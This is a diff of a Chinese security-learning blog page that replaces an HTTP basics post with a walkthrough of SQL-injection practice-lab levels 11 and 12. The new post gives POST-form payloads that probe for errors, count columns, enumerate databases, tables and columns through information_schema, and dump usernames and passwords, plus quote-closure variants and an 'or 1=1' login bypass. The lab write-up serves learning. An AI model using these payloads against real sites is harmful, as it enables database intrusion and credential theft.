@@ -3,23 +3,26 @@
 <head>
   <meta charset="utf-8">
   
-  <title>http--菜鸟教程 | Karryonr</title>
+  <title>Lesson-11~12 | Karryonr</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="一、HTTP 请求方法   序号 方法 描述    1 GET 请求指定的页面信息，并返回实体主体。   2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头   3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。   4 PUT 从客户端向服务器传送的数据取代指">
+  <meta name="description" content="一、Lesson-11此后的题为POST请求，不是之前的GET请求，需要利用burpsuit或者可以使用火狐Http Header Live小插件">
 <meta property="og:type" content="article">
-<meta property="og:title" content="http--菜鸟教程">
-<meta property="og:url" content="http://example.com/2020/12/13/http/index.html">
+<meta property="og:title" content="Lesson-11~12">
+<meta property="og:url" content="http://example.com/2021/03/15/mysql/mysql-6/index.html">
 <meta property="og:site_name" content="Karryonr">
-<meta property="og:description" content="一、HTTP 请求方法   序号 方法 描述    1 GET 请求指定的页面信息，并返回实体主体。   2 HEAD 类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头   3 POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。   4 PUT 从客户端向服务器传送的数据取代指">
+<meta property="og:description" content="一、Lesson-11此后的题为POST请求，不是之前的GET请求，需要利用burpsuit或者可以使用火狐Http Header Live小插件">
 <meta property="og:locale">
-<meta property="article:published_time" content="2020-12-13T11:11:29.000Z">
-<meta property="article:modified_time" content="2020-12-13T11:25:02.250Z">
+<meta property="og:image" content="http://example.com/2021/03/15/mysql/mysql-6/Users/john/Desktop/网安/HEXO/source/新建文件夹/15.png">
+<meta property="og:image" content="http://example.com/2021/03/15/mysql/mysql-6/Users/john/Desktop/网安/HEXO/source/新建文件夹/16.png">
+<meta property="article:published_time" content="2021-03-15T07:29:44.000Z">
+<meta property="article:modified_time" content="2021-03-15T12:37:49.121Z">
 <meta property="article:author" content="Karryonr">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/15/mysql/mysql-6/Users/john/Desktop/网安/HEXO/source/新建文件夹/15.png">
   
     <link rel="alternative" href="/atom.xml" title="Karryonr" type="application/atom+xml">
   
@@ -181,11 +184,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-http" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-mysql/mysql-6" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/12/13/http/" class="article-date">
-  	<time datetime="2020-12-13T11:11:29.000Z" itemprop="datePublished">2020-12-13</time>
+      <a href="/2021/03/15/mysql/mysql-6/" class="article-date">
+  	<time datetime="2021-03-15T07:29:44.000Z" itemprop="datePublished">2021-03-15</time>
 </a>
     </div>
   
@@ -198,7 +201,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      http--菜鸟教程
+      Lesson-11~12
       
     </h1>
   
@@ -212,8 +215,8 @@
         
           
 <div class="counter-tag counter">
-    <span id="/2020/12/13/http/" class="leancloud_visitors post-title-link"
-          style="font-size: 12px" data-flag-title="http--菜鸟教程">
+    <span id="/2021/03/15/mysql/mysql-6/" class="leancloud_visitors post-title-link"
+          style="font-size: 12px" data-flag-title="Lesson-11~12">
          &nbsp;
         view
     </span>
@@ -226,95 +229,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="一、HTTP-请求方法"><a href="#一、HTTP-请求方法" class="headerlink" title="一、HTTP 请求方法"></a>一、HTTP 请求方法</h1><table>
-<thead>
-<tr>
-<th align="left">序号</th>
-<th align="left">方法</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">1</td>
-<td align="left">GET</td>
-<td align="left">请求指定的页面信息，并返回实体主体。</td>
-</tr>
-<tr>
-<td align="left">2</td>
-<td align="left">HEAD</td>
-<td align="left">类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td>
-</tr>
-<tr>
-<td align="left">3</td>
-<td align="left">POST</td>
-<td align="left">向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和/或已有资源的修改。</td>
-</tr>
-<tr>
-<td align="left">4</td>
-<td align="left">PUT</td>
-<td align="left">从客户端向服务器传送的数据取代指定的文档的内容。</td>
-</tr>
-<tr>
-<td align="left">5</td>
-<td align="left">DELETE</td>
-<td align="left">请求服务器删除指定的页面。</td>
-</tr>
-<tr>
-<td align="left">6</td>
-<td align="left">CONNECT</td>
-<td align="left">HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td>
-</tr>
-<tr>
-<td align="left">7</td>
-<td align="left">OPTIONS</td>
-<td align="left">允许客户端查看服务器的性能。</td>
-</tr>
-<tr>
-<td align="left">8</td>
-<td align="left">TRACE</td>
-<td align="left">回显服务器收到的请求，主要用于测试或诊断。</td>
-</tr>
-<tr>
-<td align="left">9</td>
-<td align="left">PATCH</td>
-<td align="left">是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td>
-</tr>
-</tbody></table>
-<h1 id="二、HTTP状态码"><a href="#二、HTTP状态码" class="headerlink" title="二、HTTP状态码"></a>二、HTTP状态码</h1><p>常见的HTTP状态码：</p>
-<ul>
-<li>200 - 请求成功</li>
-<li>301 - 资源（网页等）被永久转移到其它URL</li>
-<li>404 - 请求的资源（网页等）不存在</li>
-<li>500 - 内部服务器错误</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th align="left">分类</th>
-<th align="left">分类描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">1**</td>
-<td align="left">信息，服务器收到请求，需要请求者继续执行操作</td>
-</tr>
-<tr>
-<td align="left">2**</td>
-<td align="left">成功，操作被成功接收并处理</td>
-</tr>
-<tr>
-<td align="left">3**</td>
-<td align="left">重定向，需要进一步的操作以完成请求</td>
-</tr>
-<tr>
-<td align="left">4**</td>
-<td align="left">客户端错误，请求包含语法错误或无法完成请求</td>
-</tr>
-<tr>
-<td align="left">5**</td>
-<td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td>
-</tr>
-</tbody></table>
+        <h1 id="一、Lesson-11"><a href="#一、Lesson-11" class="headerlink" title="一、Lesson-11"></a>一、Lesson-11</h1><p>此后的题为POST请求，不是之前的GET请求，需要利用burpsuit或者可以使用火狐Http Header Live小插件<a id="more"></a></p>
+<p><img src="/2021/03/15/mysql/mysql-6/Users\john\Desktop\网安\HEXO\source\新建文件夹\15.png" alt="15"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;  #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit 返回sql语法错误，存在注入漏洞</span><br><span class="line">uname&#x3D;&#39; order by 2 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  得出一共有两列</span><br><span class="line">uname&#x3D;&#39; union select 1,2 #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  得到回显</span><br><span class="line">uname&#x3D;&#39; union select 1,group_concat(schema_name) from information_schema.schemata #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit  查库，以此类推</span><br><span class="line">uname&#x3D;&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">uname&#x3D;&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br><span class="line">uname&#x3D;&#39; union select 1,group_concat(concat_ws(0x7e,username,password)) from security.users #&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/03/15/mysql/mysql-6/Users\john\Desktop\网安\HEXO\source\新建文件夹\16.png" alt="16"></p>
+<h1 id="二、构造注入方法"><a href="#二、构造注入方法" class="headerlink" title="二、构造注入方法"></a>二、构造注入方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#39; </span><br><span class="line">&#39;) </span><br><span class="line">&#39;))</span><br><span class="line">&#39;&#39;</span><br><span class="line">&#39;&#39;)</span><br><span class="line">&#39;&#39;))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="三、Lesson-12"><a href="#三、Lesson-12" class="headerlink" title="三、Lesson-12"></a>三、Lesson-12</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;&#39;&#39;) or 1&#x3D;1&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -324,18 +247,18 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/03/15/mysql/mysql-5/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/03/15/mysql/mysql-7/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">&lt;</strong>
       <div class="article-nav-title">
         
-          Lesson-7~10
+          Lesson-13~16
         
       </div>
     </a>
   
   
-    <a href="/2020/12/06/Burp-Suit/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Burp Suit</div>
+    <a href="/2021/03/15/mysql/mysql-5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Lesson-7~10</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
@@ -345,7 +268,7 @@
 </article>
 
 
-<div class="ds-share share" data-thread-key="http" data-title="http--菜鸟教程" data-url="http://example.com/2020/12/13/http/"  data-images="/img/啦啦啦.jpg" data-content="http--菜鸟教程">
+<div class="ds-share share" data-thread-key="mysql/mysql-6" data-title="Lesson-11~12" data-url="http://example.com/2021/03/15/mysql/mysql-6/"  data-images="/img/啦啦啦.jpg" data-content="Lesson-11~12">
     <div class="ds-share-inline">
       <ul  class="ds-share-icons-16">
       	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
